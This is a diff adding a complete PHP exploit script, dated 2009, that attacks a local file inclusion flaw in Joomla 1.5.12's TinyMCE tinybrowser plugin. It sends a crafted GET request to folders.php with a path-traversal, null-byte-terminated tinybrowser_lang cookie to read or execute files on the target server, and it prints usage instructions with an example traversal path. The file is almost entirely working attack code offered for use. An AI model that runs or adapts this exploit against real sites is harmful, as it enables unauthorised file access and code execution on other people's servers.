@@ -1,0 +1,74 @@
+<?php
+	/*
+		Copyright (c) ITIX LTD
+
+		This program is free software: you can redistribute it and/or modify
+		it under the terms of the GNU General Public License as published by
+		the Free Software Foundation, either version 3 of the License, or
+		(at your option) any later version.
+
+		This program is distributed in the hope that it will be useful,
+		but WITHOUT ANY WARRANTY; without even the implied warranty of
+		MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+		GNU General Public License for more details.
+
+		You should have received a copy of the GNU General Public License
+		along with this program.  If not, see <http://www.gnu.org/licenses/>.
+
+		TITLE:		Joomla 1.5.12 read/exec remote files
+		AUTHOR:		Nikola Petrov (vp.nikola@gmail.com)
+		VERSION:	1.0
+		LICENSE:	GNU General Public License
+
+		Platform: Joomla 1.5.12
+		Vulnerabilities discovery and implementation: Nikola Petrov (vp.nikola@gmail.com)
+		Date: 27.08.2009
+	*/
+	
+	print "\n\n#########################################################################\n";
+	print "# LFI discovery and implementation: Nikola Petrov (vp.nikola@gmail.com)\n";
+	print "# Date: 27.08.2009\n";
+	print "#########################################################################\n\n";
+
+	if($argc < 4) {
+		print "usage: php ". $argv[0] ." host path file [port] [debug]\n";
+		print "example: php ". $argv[0] ." localhost /j1512 ../../../../../../../../wamp/www/j1512/images/stories/duck.jpg 80 1\n";
+		exit();
+	}
+	
+	$Host = $argv[1];
+	$Path = $argv[2] . '/plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/folders.php';
+	$File = $argv[3] . '%00';
+	
+	empty($argv[4]) ? $Port = 80 : $Port = $argv[4];
+	empty($argv[5]) ? $Debug = 0 : $Debug = 1;
+
+	function HttpSend($aHost, $aPort, $aPacket) {
+		$Response = "";
+
+		if(!$Socket = fsockopen($aHost, $aPort)) {
+			print "Error connecting to $aHost:$aPort\n\n";
+			exit();
+		}
+		
+		fputs($Socket, $aPacket);
+		
+		while(!feof($Socket)) $Response .= fread($Socket, 1024);
+		
+		fclose($Socket);
+		
+		return $Response;
+	}
+	
+	$Packet  = "GET {$Path} HTTP/1.0\r\n";
+	$Packet .= "Host: {$Host}\r\n";
+	$Packet .= "Cookie: tinybrowser_lang={$File}\r\n";
+	$Packet .= "Connection: close\r\n\r\n";
+	
+	if($Debug) {
+		print "Request to '$Host:$Port':\n";
+		print $Packet;
+	}
+	
+	print HttpSend($Host, $Port, $Packet);
+?>
